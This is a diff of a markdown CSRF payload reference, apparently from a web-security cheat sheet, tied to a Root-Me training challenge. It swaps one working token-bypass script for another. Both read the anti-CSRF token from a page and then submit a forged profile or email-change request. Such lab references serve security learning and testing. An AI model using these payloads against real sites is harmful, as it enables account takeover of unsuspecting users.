@@ -95,25 +95,16 @@ Access [this challenge](https://www.root-me.org/en/Challenges/Web-Client/CSRF-0-
 Sample payload for bypassing CSRF Token. Access [this challenge](https://www.root-me.org/en/Challenges/Web-Client/CSRF-token-bypass)
 
 ```
-<form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
-                <input id="username" type="text" name="username" value="1337">
-                <input id="status" type="checkbox" name="status" checked >
-                <input id="token" type="hidden" name="token" value="" />
-                <button type="submit">Submit</button>
-</form>
 <script>
-
-                xhttp = new XMLHttpRequest();
-                xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
-                xhttp.send();
-
-                // extraction du token
-                token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));
-
-                // insertion du token dans notre formulaire
-                 document.getElementById('token').setAttribute('value', token_admin)
-
-                // envoi du formulaire
-                document.csrf_form.submit();
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
 </script>
 ```
